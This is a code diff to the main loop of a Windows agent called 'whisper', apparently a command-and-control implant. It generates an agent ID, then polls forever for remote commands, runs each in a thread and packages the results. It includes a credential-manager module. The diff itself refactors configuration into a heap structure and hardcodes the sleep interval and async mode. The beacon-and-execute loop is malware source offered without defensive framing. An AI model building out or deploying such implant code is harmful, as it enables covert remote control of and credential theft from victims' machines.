@@ -7,6 +7,7 @@
 #include "whisper_winapi.h"
 #include "whisper_dynamic_config.h"
 #include "whisper_credmanager.h"
+#include "whisper_structs.h"
 #include <time.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -25,7 +26,7 @@ this? either at front or back.
 // int execute();
 DWORD execute(LPVOID exec_args);
 void generate_uuid4(char *agent_id);
-void execution_setup(char *agent_id, CONFIG *config);
+void execution_setup(char *agent_id, HeapStore *heapStorePointer);
 
 // ASYNC BEACON!!!
 /*
@@ -53,28 +54,45 @@ int main()
 
     DEBUG_LOG("STARTING");
 
+    // init heap config
+    HeapStore *heapStorePointer = malloc(sizeof(HeapStore));
+    if (heapStorePointer == NULL)
+    {
+        fprintf(stderr, "Memory allocation failed for HeapStore\n");
+        return 1;
+    }
+    // Initialize the subsystems; if it fails, free memory and exit
+    if (initStructs(heapStorePointer) != 0)
+    {
+        free(heapStorePointer);
+        return 1;
+    }
+
+    generate_uuid4(heapStorePointer->agentStore->agent_id);
+
+    // move to heapstruct
     char agent_id[37];
     generate_uuid4(agent_id);
-    CONFIG *config = init_config();
+    // CONFIG *config = init_config();
 
     // Example of setting the execution mode (you can do this at any point in your code)
-    set_execution_mode(EXEC_MODE_SYNC, config); // Initially run synchronously
+    set_execution_mode(EXEC_MODE_SYNC, heapStorePointer); // Initially run synchronously
 
     while (1)
     {
-        execution_setup(agent_id, config); // Call the command execution function
+        execution_setup(agent_id, heapStorePointer); // Call the command execution function
         DEBUG_LOG("EXECUTION SUCCESS");
 
         // WhisperSleep(get_sleep_time());
         // Sleep is in MS, so we take the input of sleep time * 1000 to get seconds
-        WhisperSleep(1000 * get_sleep_time(config));
+        WhisperSleep(1000 * 10); // get_sleep_time(config));
     }
 
     return 0;
 }
 
 // Function to execute the command (switching logic)
-void execution_setup(char *agent_id, CONFIG *config)
+void execution_setup(char *agent_id, HeapStore *heapStorePointer)
 {
     // ... command checking logic (when you implement it) ...
 
@@ -85,9 +103,10 @@ void execution_setup(char *agent_id, CONFIG *config)
         return; // handle allocation error
 
     exec_args->agent_id = agent_id;
-    exec_args->config = config;
+    exec_args->heapStorePointer = heapStorePointer;
 
-    switch (get_execution_mode(config))
+    // switch (get_execution_mode(config))
+    switch (EXEC_MODE_ASYNC)
     {
     case EXEC_MODE_ASYNC:
     {
@@ -139,7 +158,7 @@ DWORD WINAPI execute(LPVOID exec_args)
     EXEC_ARGS *thread_args = (EXEC_ARGS *)exec_args;
 
     char *agent_id = thread_args->agent_id;
-    CONFIG *config = thread_args->config;
+    HeapStore *heapStorePointer = thread_args->heapStorePointer;
 
     // this fills in the command, arg and command_id
     InboundJsonDataStruct InboundJsonData = get_command_data(agent_id);
@@ -174,7 +193,7 @@ DWORD WINAPI execute(LPVOID exec_args)
     OutboundJsonData->command_result_data = NULL;
 
     // Parse command and modify OutboundJsonData
-    parse_command(InboundJsonData.command, InboundJsonData.args, OutboundJsonData, config);
+    parse_command(InboundJsonData.command, InboundJsonData.args, OutboundJsonData, heapStorePointer);
 
     DEBUG_LOG("UUID: %s\n", OutboundJsonData->agent_id);
     DEBUG_LOG("COMMAND_ID: %s\n", InboundJsonData.command_id);
